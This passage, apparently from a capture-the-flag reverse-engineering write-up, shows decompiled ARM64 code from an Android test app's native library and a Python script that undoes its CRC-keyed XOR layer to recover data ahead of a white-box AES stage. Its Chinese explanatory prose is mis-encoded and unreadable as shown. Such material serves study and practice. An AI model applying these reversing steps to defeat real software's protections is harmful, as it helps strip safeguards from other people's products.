class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>v6</span> <span class=o>&gt;&gt;</span> <span class=mi>28</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>v5</span> <span class=o>&gt;&gt;</span> <span class=mi>28</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>      <span class=n>v13</span><span class=p>[(</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>                            <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=n>v4</span> <span class=o>+</span> <span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                            <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>BYTE2</span><span class=p>(</span><span class=n>v8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>BYTE2</span><span class=p>(</span><span class=n>v7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>                         <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>9</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>BYTE2</span><span class=p>(</span><span class=n>v6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>BYTE2</span><span class=p>(</span><span class=n>v5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)))</span> <span class=o>|</span> <span class=p>(</span><span class=mi>16</span> <span class=o>*</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=n>v4</span> <span class=o>+</span> <span class=mi>10</span><span class=p>)</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>v8</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>((</span><span class=n>v7</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>))]</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>7</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>v6</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>((</span><span class=n>v5</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>      <span class=n>v13</span><span class=p>[(</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>                            <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=n>v4</span> <span class=o>+</span> <span class=mi>17</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                            <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>14</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>v8</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>((</span><span class=n>v7</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>                         <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>15</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>v6</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>((</span><span class=n>v5</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)))</span> <span class=o>|</span> <span class=p>(</span><span class=mi>16</span> <span class=o>*</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=n>v4</span> <span class=o>+</span> <span class=mi>16</span><span class=p>)</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>12</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>v8</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>v7</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>))]</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>13</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>v6</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>v5</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>      <span class=n>v13</span><span class=p>[(</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>                            <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>23</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                            <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>20</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>v8</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>v7</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>                         <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>21</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>v6</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>v5</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)))</span> <span class=o>|</span> <span class=p>(</span><span class=mi>16</span>
</span></span><span class=line><span class=cl>                                                                                            <span class=o>*</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>                                                                                                 <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>22</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                                                                 <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>18</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>v8</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>v7</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>                                                                                              <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>19</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>v6</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>                                                                                                <span class=o>+</span> <span class=p>(</span><span class=n>v5</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>shift</span><span class=p>(</span><span class=n>v13</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>k</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>k</span> <span class=o>&lt;=</span> <span class=mi>15</span><span class=p>;</span> <span class=o>++</span><span class=n>k</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>a2</span> <span class=o>+</span> <span class=n>k</span><span class=p>)</span> <span class=o>=</span> <span class=n>v15</span><span class=p>[</span><span class=mi>256</span> <span class=o>*</span> <span class=n>k</span> <span class=o>+</span> <span class=n>v13</span><span class=p>[</span><span class=n>k</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>  <span class=n>_ReadStatusReg</span><span class=p>(</span><span class=n>ARM64_SYSREG</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_37F0</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>a3</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// x0
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [xsp+8h] [xbp-38h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v9</span><span class=p>;</span> <span class=c1>// [xsp+34h] [xbp-Ch] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v10</span><span class=p>;</span> <span class=c1>// [xsp+38h] [xbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v10</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_ReadStatusReg</span><span class=p>(</span><span class=n>ARM64_SYSREG</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span> <span class=o>+</span> <span class=mi>40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=n>a4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>sub_3750</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v9</span><span class=p>,</span> <span class=mi>4uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>a3</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>a2</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>a1</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>result</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>*</span> <span class=p>(</span><span class=n>i</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>  <span class=n>_ReadStatusReg</span><span class=p>(</span><span class=n>ARM64_SYSREG</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_3750</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [xsp+10h] [xbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [xsp+1Ch] [xbp-14h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=n>loc_3678</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>a2</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v4</span> <span class=o>=</span> <span class=n>dword_65FB8</span><span class=p>[(</span><span class=n>v4</span> <span class=o>^</span> <span class=o>*</span><span class=p>(</span><span class=n>a1</span> <span class=o>+</span> <span class=n>i</span><span class=p>))]</span> <span class=o>^</span> <span class=p>(</span><span class=n>v4</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>~</span><span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>Java_com_example_test_MainActivity_Get</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>j</span><span class=p>;</span> <span class=c1>// [xsp+4h] [xbp-2Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// [xsp+8h] [xbp-28h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [xsp+Ch] [xbp-24h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>__break</span><span class=p>(</span><span class=mi>1u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>dword_65FB4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>256</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v1</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>for</span> <span class=p>(</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>v1</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>v1</span> <span class=o>=</span> <span class=p>(</span><span class=n>v1</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^</span> <span class=mh>0xEDB88320</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>          <span class=n>v1</span> <span class=o>&gt;&gt;=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=n>dword_65FB8</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>dword_65FB4</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>åˆ†æå¯çŸ¥s1æ˜¯å¯†æ–‡ï¼Œsub_3FD0æ˜¯ç™½ç›’AESï¼ˆå¾ˆå¤§çš„æŸ¥è¡¨æ“ä½œï¼‰ï¼Œsub_37F0æ˜¯å¸¦æœ‰crcçš„å¼‚æˆ–åŠ å¯†</p><p>é¦–å…ˆåˆ†æcrcåŠ å¯†ï¼Œä½¿ç”¨äº†dword_65FB8æ¥æŸ¥è¡¨è®¡ç®—ï¼Œäº¤å‰å¼•ç”¨å‘ç°åœ¨Java_com_example_test_MainActivity_Getè¿›è¡Œäº†åˆå§‹åŒ–ï¼Œå¯ä»¥ç›´æ¥æ¨¡æ‹Ÿé€»è¾‘ç”Ÿæˆã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>init_crc_table</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>crc_table</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^</span> <span class=mh>0xEDB88320</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>&gt;&gt;=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>crc_table</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>crc_table</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>crc_table</span> <span class=o>=</span> <span class=n>init_crc_table</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>compute_crc</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>crc</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>byte</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>crc</span> <span class=o>=</span> <span class=p>(</span><span class=n>crc</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>^</span> <span class=n>crc_table</span><span class=p>[(</span><span class=n>crc</span> <span class=o>^</span> <span class=n>byte</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>crc</span> <span class=o>^</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key_crc</span> <span class=o>=</span> <span class=n>compute_crc</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;love&#39;</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert_sub_37F0</span><span class=p>(</span><span class=n>s1</span><span class=p>,</span> <span class=n>key_crc</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>shift</span> <span class=o>=</span> <span class=mi>8</span> <span class=o>*</span> <span class=p>(</span><span class=n>i</span> <span class=o>%</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>v5</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>s1</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=p>((</span><span class=n>key_crc</span> <span class=o>&gt;&gt;</span> <span class=n>shift</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>v5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;0BCF797EC7EA5F31BCEEE70B1E91AADD6F07C1103675200632E3D066B87DFC90&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>v5</span> <span class=o>=</span> <span class=n>invert_sub_37F0</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>key_crc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>v5</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>    <span class=c1># df59d8a5137cfeea687846d0ca070b06bb9160cbe2e381dde67571bd6ceb5d4b</span>
